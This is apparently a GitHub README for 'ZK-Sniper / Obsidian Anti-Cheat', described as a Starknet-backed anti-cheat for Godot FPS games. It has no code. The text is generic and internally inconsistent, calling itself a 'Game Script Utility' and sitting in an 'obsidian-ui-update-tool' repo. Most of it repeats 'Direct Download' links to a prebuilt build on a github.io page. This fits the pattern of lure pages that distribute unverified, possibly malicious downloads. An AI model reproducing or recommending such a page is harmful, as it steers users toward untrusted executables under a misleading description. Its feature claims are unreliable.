# ZK-Sniper / Obsidian Anti-Cheat v1.0 - Game Script Utility 2026

> A privacy-first anti-cheat layer for Godot FPS projects, centered on Starknet-based verification and local tooling for gameplay integrity checks plus UI-driven updates.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Godot-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/felixwestsuz1703/obsidian-ui-update-tool?style=flat-square)](https://github.com/felixwestsuz1703/obsidian-ui-update-tool)

---

<p align="center">
  <a href="https://felixwestsuz1703.github.io/obsidian-ui-update-tool/">
    <img src="https://img.shields.io/badge/Download-ZK-Sniper%20%2F%20Obsidian%20Anti-Cheat%20Script-brightgreen?style=for-the-badge" alt="Download ZK-Sniper / Obsidian Anti-Cheat Script">
  </a>
</p>

> **[Direct Download - ZK-Sniper / Obsidian Anti-Cheat](https://felixwestsuz1703.github.io/obsidian-ui-update-tool/)**

---

[Download Latest Build](https://felixwestsuz1703.github.io/obsidian-ui-update-tool/)

---

## What This Is

ZK-Sniper / Obsidian Anti-Cheat is made for FPS games built in Godot that need verification logic anchored to Starknet rather than local kernel-level components. It is focused on game-physics checks that can be expressed on-chain, using a workflow that ties together Cairo contracts, Starknet transactions, and local execution helpers.

The project is designed to provide real-time anti-cheat visibility and coordination through Torii, while Katana and Starkli handle local development and transaction movement. Its approach leans on cryptographic verification and privacy-preserving checks, but keeps the runtime model on the game-validation side instead of file inspection or driver-based monitoring.

---

## Feature Set

- On-chain verification for game physics and related state checks
- Built to help identify aimbot and wallhack behavior in FPS environments
- No kernel drivers required in the described setup
- No local file scanning in the core approach
- Local execution workflow supported with Katana and Starkli
- Torii-based updates for live interface feedback
- Uses Starknet and zero-knowledge proof concepts in the verification flow
- Cairo contract integration for blockchain-backed anti-cheat logic

---

## Setup

1. Download the latest build from the project download page.
2. Place the files in your Godot project or the folder prepared for the anti-cheat integration.
3. Start the local Starknet tooling if your workflow depends on it:
   - Katana for local chain execution
   - Starkli for contract interaction
   - Torii for live data updates
4. Connect the script or module to the game logic that needs verification.

Example flow:

1. Run local chain services.
2. Deploy or point to the Cairo contracts.
3. Load the anti-cheat layer into the Godot project.
4. Confirm that UI updates and verification calls are being received.

---

## Configuration

| Setting | Purpose | Typical Use |
| --- | --- | --- |
| `LOCAL_CHAIN` | Points to the local Starknet environment | Development and testing |
| `TORII_SYNC` | Enables live UI data updates | Monitoring gameplay state |
| `PHYSICS_VERIFY` | Turns on physics verification checks | Anti-cheat enforcement |
| `CONTRACT_ADDRESS` | Contract endpoint used by the integration | Deployment-specific configuration |
| `LOG_LEVEL` | Controls output detail | Debugging and validation |

Example configuration:

    LOCAL_CHAIN=true
    TORII_SYNC=true
    PHYSICS_VERIFY=true
    CONTRACT_ADDRESS=0x...
    LOG_LEVEL=info

---

## Compatibility

This project targets Godot-based FPS titles and workflows built around Starknet, Cairo contracts, Katana, Starkli, and Torii. It is not meant to be a universal anti-cheat for every engine or platform.

Known constraints:

- Best suited to projects that can connect gameplay events to on-chain verification
- Requires matching contract and local tooling setup
- Behavior depends on how the host game exposes physics and state data
- Some features are tied to the Starknet-oriented development stack

---

## FAQ

### How do I install it?

Download the latest build, then add it to your Godot project or the integration folder used by your game. After that, connect the contract and local tooling references required by your setup.

### How are updates handled?

Updates are distributed through the project download link. If you are using local Starknet services, recheck contract addresses and configuration after updating.

### Can I customize the verification flow?

Yes. The configuration is intended to be adjusted for contract endpoints, logging, local chain use, and verification behavior. The exact changes depend on your project structure.

### Does it work with every FPS game?

No. It is aimed at Godot-based FPS projects and at game pipelines that can support Starknet-backed checks and related integration points.

### What storage or runtime tools are needed?

The workflow may involve local chain services, contract artifacts, and game-side integration files. Storage needs depend on your deployment and the amount of local blockchain data you keep.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
